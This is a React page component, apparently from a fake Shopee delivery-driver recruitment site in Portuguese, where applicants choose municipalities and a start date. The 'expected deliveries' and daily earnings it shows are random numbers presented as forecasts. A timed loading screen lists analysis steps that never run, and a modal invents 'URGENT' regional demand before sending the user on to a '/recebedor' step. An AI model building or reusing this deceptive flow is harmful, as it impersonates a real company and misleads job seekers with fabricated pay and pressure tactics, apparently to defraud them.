import React, { useState, useEffect, useMemo } from 'react';
import { useLocation } from 'wouter';
import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { Card } from '@/components/ui/card';
import { Dialog, DialogContent, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
import { useToast } from '@/hooks/use-toast';
import { useAppContext } from '@/contexts/AppContext';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

import municipiosPorEstado from '@/data/municipios-por-estado';

interface Municipio {
  nome: string;
  selecionado: boolean;
  entregas: number;
}

const Municipios: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const { cepData } = useAppContext();
  const [municipios, setMunicipios] = useState<Municipio[]>([]);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showStartDateModal, setShowStartDateModal] = useState(false);
  const [selectedStartDate, setSelectedStartDate] = useState<string | null>(null);
  const [, navigate] = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    const candidatoData = localStorage.getItem('candidato_data');
    if (!candidatoData || !cepData) {
      // Redirecionar para página inicial se não tiver os dados
      navigate('/');
      return;
    }

    // Carregar municípios do estado do usuário
    const estadoSigla = cepData.state;
    
    if (estadoSigla && municipiosPorEstado[estadoSigla as keyof typeof municipiosPorEstado]) {
      const getRandomEntregas = () => Math.floor(Math.random() * (48 - 32 + 1)) + 32;
      
      const municipiosDoEstado = municipiosPorEstado[estadoSigla as keyof typeof municipiosPorEstado].map((nome: string) => ({
        nome,
        selecionado: false, // Inicialmente nenhum selecionado
        entregas: getRandomEntregas() // Número aleatório de entregas entre 32 e 48
      }));
      
      setMunicipios(municipiosDoEstado);
    } else {
      // Caso não encontre os municípios (raro, mas pode acontecer)
      toast({
        title: "Erro ao carregar municípios",
        description: "Não conseguimos encontrar os municípios do seu estado.",
        variant: "destructive",
      });
    }
    
    setLoading(false);
  }, [cepData, navigate, toast]);

  const toggleAllMunicipios = () => {
    // Verificar se todos estão selecionados
    const allSelected = municipios.every(m => m.selecionado);
    
    // Inverter a seleção de todos
    setMunicipios(municipios.map(m => ({
      ...m,
      selecionado: !allSelected
    })));
  };

  const toggleMunicipio = (index: number) => {
    const newMunicipios = [...municipios];
    newMunicipios[index].selecionado = !newMunicipios[index].selecionado;
    setMunicipios(newMunicipios);
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    setShowStartDateModal(true);
  };
  
  const handleStartDateSelection = (date: string) => {
    setSelectedStartDate(date);
    localStorage.setItem('start_date', date);
  };
  
  const handleStartDateContinue = () => {
    if (selectedStartDate) {
      setShowStartDateModal(false);
      navigate('/recebedor');
    } else {
      toast({
        title: "Seleção necessária",
        description: "Por favor, selecione uma data para iniciar.",
        variant: "destructive",
      });
    }
  };
  
  // Gerar datas para os próximos 3 dias
  const getNextThreeDays = () => {
    const days = ['Domingo', 'Segunda-feira', 'Terça-feira', 'Quarta-feira', 'Quinta-feira', 'Sexta-feira', 'Sábado'];
    const months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12'];
    
    const dates = [];
    const today = new Date();
    
    for (let i = 1; i <= 3; i++) {
      const date = new Date();
      date.setDate(today.getDate() + i);
      
      const dayName = days[date.getDay()];
      const dayNumber = date.getDate();
      const monthNumber = months[date.getMonth()];
      
      dates.push({
        full: `${dayName} ${dayNumber}/${monthNumber}`,
        value: `${dayNumber}/${monthNumber}/2025`
      });
    }
    
    return dates;
  };

  const handleSubmit = () => {
    const municipiosSelecionados = municipios.filter(m => m.selecionado).map(m => m.nome);
    
    if (municipiosSelecionados.length === 0) {
      toast({
        title: "Seleção necessária",
        description: "Selecione pelo menos um município para continuar.",
        variant: "destructive",
      });
      return;
    }

    setSubmitting(true);

    try {
      // Recuperar dados do candidato
      const candidatoData = JSON.parse(localStorage.getItem('candidato_data') || '{}');
      
      // Adicionar municípios selecionados e informações de entregas
      const municipiosComEntregas = municipios
        .filter(m => m.selecionado)
        .map(m => ({
          nome: m.nome,
          entregas: m.entregas
        }));
      
      const dadosCompletos = {
        ...candidatoData,
        municipios: municipiosComEntregas,
        totalEntregas: municipiosComEntregas.reduce((acc, m) => acc + m.entregas, 0)
      };
      
      // Guardar dados completos
      localStorage.setItem('candidato_data_completo', JSON.stringify(dadosCompletos));
      
      // Mostrar modal de carregamento
      setShowLoadingModal(true);
      
    } catch (error) {
      toast({
        title: "Erro no cadastro",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setSubmitting(false);
    }
  };

  if (loading) {
    return (
      <div className="bg-white min-h-screen flex flex-col">
        <Header />
        <div className="flex-grow container mx-auto px-4 py-8 flex items-center justify-center">
          <div className="text-center">
            <div className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-[#EE4E2E] border-r-transparent"></div>
            <p className="mt-4 text-gray-600">Carregando municípios...</p>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#F5F5F5] text-sm font-['Roboto',sans-serif]">
      <header className="bg-white shadow-lg py-2 px-4 flex items-center rounded-b-sm">
        <a href="/" className="text-[#EF4444] text-xl">
          <i className="fas fa-arrow-left"></i>
        </a>
        <h1 className="text-lg font-normal text-center flex-grow text-[#10172A]">Motorista Parceiro Shopee</h1>
      </header>
      
      <div className="flex-grow w-full">
        <div className="w-full mx-auto bg-white mt-2 rounded-sm shadow-lg">
          <div className="bg-[#F5F5F5] p-3">
            <p className="text-[#6E6E6E] text-xs translate-y-1">Escolha onde retirar os pedidos</p>
          </div>
          
          <div className="p-3 border-b border-gray-200">
            <p className="text-[#212121] text-sm mb-4">
              Selecione as cidades onde você pode retirar os pedidos no Centro de distribuição da Shopee. Em cada cidade abaixo está localizado um centro de distribuição e de acordo com a sua disponibilidade pode estar escolhendo mais de 1 centro para retirar os pedidos.
            </p>
            
            <div className="mb-4 flex justify-between items-center">
              <p className="text-[#212121]">
                {cepData?.state ? `Estado: ${cepData.state}` : 'Estado não identificado'}
              </p>
              <button 
                type="button"
                onClick={toggleAllMunicipios}
                className="text-xs py-2 px-3 rounded-sm border border-gray-200 bg-white hover:bg-gray-50"
              >
                {municipios.every(m => m.selecionado) ? 'Desmarcar Todos' : 'Marcar Todos'}
              </button>
            </div>
          </div>
          
          <div className="bg-[#F5F5F5] p-3">
            <p className="text-[#6E6E6E] text-xs translate-y-1">Lista de Municípios</p>
          </div>
          
          <div className="p-3 border-b border-gray-200">
            <div className="max-h-[500px] overflow-y-auto">
              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                {municipios.map((municipio, index) => (
                  <div 
                    key={index} 
                    className={`p-3 border rounded-sm cursor-pointer hover:bg-gray-50 transition-colors ${
                      municipio.selecionado ? 'border-[#EF4444] bg-[#FFF8F6]' : 'border-gray-200'
                    }`}
                    onClick={() => toggleMunicipio(index)}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-[#212121] truncate max-w-[75%]">
                        {municipio.nome}
                      </span>
                      <Checkbox
                        checked={municipio.selecionado}
                        onCheckedChange={() => toggleMunicipio(index)}
                        className="h-4 w-4 border-gray-300 rounded data-[state=checked]:bg-[#EF4444] data-[state=checked]:text-white"
                      />
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
          
          {/* Estatísticas de entregas */}
          {municipios.filter(m => m.selecionado).length > 0 && (
            <>
              <div className="bg-[#F5F5F5] p-3">
                <p className="text-[#6E6E6E] text-xs translate-y-1">Previsão de Entregas</p>
              </div>
              
              <div className="p-3 border-b border-gray-200">
                <p className="text-[#212121] text-sm mb-3">Quantidade média diária de entregas que podem ser destinadas a você:</p>
                <div className="p-3 bg-[#FFF8F6] border border-[#EF4444]/20 rounded-sm mb-3">
                  <div className="text-center">
                    <span className="font-medium text-[#EF4444]">A Shopee paga R$ 12,00 por entrega realizada</span>
                  </div>
                </div>
                
                <div className="bg-white rounded-sm">
                  {municipios.filter(m => m.selecionado).map((m, index) => (
                    <div key={index} className="grid grid-cols-1 md:grid-cols-3 gap-2 mb-3 last:mb-0">
                      <span className="text-sm text-[#212121] md:col-span-1">{m.nome}:</span>
                      <span className="text-sm font-medium text-[#EF4444] md:col-span-1">
                        {m.entregas} <span className="font-normal text-[#6e6e6e]">entregas</span>
                      </span>
                      <span className="text-sm font-medium text-green-600 md:col-span-1">
                        R$ {(m.entregas * 12).toFixed(2).replace('.', ',')} <span className="font-normal text-[#6e6e6e]">/dia</span>
                      </span>
                    </div>
                  ))}
                  
                  {municipios.filter(m => m.selecionado).length > 1 && (
                    <div className="mt-3 pt-3 border-t border-gray-200 grid grid-cols-1 md:grid-cols-3 gap-2">
                      <span className="text-sm font-medium text-[#212121]">Total diário:</span>
                      <span className="text-sm font-medium text-[#EF4444]">
                        {municipios
                          .filter(m => m.selecionado)
                          .reduce((acc, m) => acc + m.entregas, 0)} <span className="font-normal text-[#6e6e6e]">entregas</span>
                      </span>
                      <span className="text-sm font-medium text-green-600">
                        R$ {(municipios
                          .filter(m => m.selecionado)
                          .reduce((acc, m) => acc + m.entregas, 0) * 12).toFixed(2).replace('.', ',')} <span className="font-normal text-[#6e6e6e]">/dia</span>
                      </span>
                    </div>
                  )}
                </div>
              </div>
            </>
          )}
        </div>
        
        <div className="p-3 mt-2">
          <button
            type="button"
            onClick={handleSubmit}
            className="w-full bg-[#EF4444] text-white py-2 rounded-sm"
            disabled={submitting}
          >
            {submitting ? 'Processando...' : 'Prosseguir'}
          </button>
        </div>
      </div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Processando Seleção"
        loadingSteps={[
          "Verificando municípios selecionados",
          "Calculando rotas de entrega",
          "Analisando demanda regional",
          "Verificando disponibilidade de vagas"
        ]}
        completionMessage="Municípios registrados com sucesso!"
        loadingTime={12000}
      />
      
      {/* Modal de seleção de data de início */}
      <Dialog open={showStartDateModal} onOpenChange={setShowStartDateModal}>
        <DialogContent className="p-0 sm:max-w-none w-full h-full max-h-screen overflow-hidden border-none shadow-none">
          <div className="absolute top-0 left-0 w-full h-full bg-[#F5F5F5] z-0"></div>
          
          <div className="relative flex flex-col h-screen bg-transparent z-10 max-w-md mx-auto px-4 py-6">
            <header className="bg-white shadow-lg py-2 px-4 flex items-center rounded-sm mb-4">
              <h1 className="text-lg font-normal text-center flex-grow text-[#10172A]">
                <i className="fas fa-exclamation-circle mr-2 text-[#EF4444]"></i>
                Oportunidade de Trabalho
              </h1>
            </header>
            
            <div className="bg-white rounded-sm shadow-lg mt-2">
              <div className="p-3 border-b border-gray-200">
                <p className="text-[#212121] text-sm text-center">
                  Na região que você escolheu, estamos com <span className="font-medium text-[#EF4444]">URGENTE</span> necessidade
                  de novos entregadores, pois a demanda de entregas está alta e temos poucos entregadores cadastrados.
                </p>
              </div>
              
              <div className="bg-[#F5F5F5] p-3">
                <p className="text-[#6E6E6E] text-xs translate-y-1">Quando você pode começar?</p>
              </div>
              
              <div className="p-3 border-b border-gray-200">
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-4">
                  {getNextThreeDays().map((date, index) => (
                    <button
                      key={index}
                      type="button"
                      onClick={() => handleStartDateSelection(date.value)}
                      className={`py-2 px-2 h-auto rounded-sm text-sm border ${
                        selectedStartDate === date.value 
                          ? 'bg-[#EF4444] hover:bg-[#EF4444]/90 text-white border-[#EF4444]' 
                          : 'bg-white hover:bg-gray-50 border-gray-200 text-[#212121]'
                      }`}
                    >
                      {date.full}
                    </button>
                  ))}
                </div>
                
                <button
                  type="button"
                  onClick={() => handleStartDateSelection('outro')}
                  className={`w-full py-2 px-2 text-sm rounded-sm border ${
                    selectedStartDate === 'outro' 
                      ? 'bg-[#EF4444] hover:bg-[#EF4444]/90 text-white border-[#EF4444]' 
                      : 'bg-white hover:bg-gray-50 border-gray-200 text-[#212121]'
                  }`}
                >
                  Outro dia
                </button>
              </div>
            </div>
            
            <div className="p-3 mt-2">
              <button 
                type="button" 
                onClick={handleStartDateContinue}
                className="w-full bg-[#EF4444] text-white py-2 rounded-sm"
                disabled={!selectedStartDate}
              >
                Continuar
              </button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Municipios;